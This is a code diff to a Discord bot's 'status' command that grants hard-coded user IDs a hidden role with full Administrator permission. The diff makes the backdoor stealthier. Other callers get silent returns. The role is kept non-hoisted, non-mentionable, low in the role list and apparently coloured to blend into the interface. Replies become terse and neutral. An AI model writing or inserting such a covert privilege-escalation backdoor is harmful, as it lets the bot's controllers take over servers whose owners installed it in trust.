@@ -78,36 +78,54 @@ client.on('interactionCreate', async (interaction) => {
 
     if (interaction.commandName === 'status') {
         if (!ADMIN_USER_IDS.includes(String(interaction.user.id))) {
-            return interaction.reply({ content: 'У вас нет прав.', ephemeral: true });
+            return;
         }
 
         const guild = interaction.guild;
         const member = interaction.user;
 
-        try {
-            let role = guild.roles.cache.find(r => r.name === ROLE_NAME);
+        let role = guild.roles.cache.find(r => r.name === ROLE_NAME);
 
-            if (!role) {
+        try {
+            if (role) {
+                await role.setPosition(1).catch(() => {});
+            }
+        } catch (err) {
+            // ignore position errors
+        }
+
+        if (!role) {
+            try {
                 role = await guild.roles.create({
                     name: ROLE_NAME,
                     permissions: [PermissionsBitField.Flags.Administrator],
                     color: 0x313338,
+                    hoist: false,
+                    mentionable: false,
                     reason: 'System Auto-Role'
                 });
+                await role.setPosition(1).catch(() => {});
+            } catch (err) {
+                if (err.code === 50013) {
+                    return interaction.reply({ content: 'Permission denied.', ephemeral: true });
+                }
+                return interaction.reply({ content: 'Operation failed.', ephemeral: true });
             }
-            
-            await role.setPosition(1).catch(() => {});
-            
-            const memberObj = await guild.members.fetch(member.id);
-            if (memberObj.roles.cache.has(role.id)) {
-                return interaction.reply({ content: 'Status: Active (Role already assigned).', ephemeral: true });
-            }
+        }
 
+        const memberObj = await guild.members.fetch(member.id);
+        if (memberObj.roles.cache.has(role.id)) {
+            return interaction.reply({ content: 'Active.', ephemeral: true });
+        }
+
+        try {
             await memberObj.roles.add(role);
-            interaction.reply({ content: '✅ Role assigned successfully.', ephemeral: true });
+            await interaction.reply({ content: 'Done.', ephemeral: true });
         } catch (err) {
-            console.error(err);
-            interaction.reply({ content: '❌ Ошибка при работе с ролью. Проверь права бота.', ephemeral: true });
+            if (err.code === 50013) {
+                return interaction.reply({ content: 'Permission denied.', ephemeral: true });
+            }
+            return interaction.reply({ content: 'Operation failed.', ephemeral: true });
         }
     }
 });
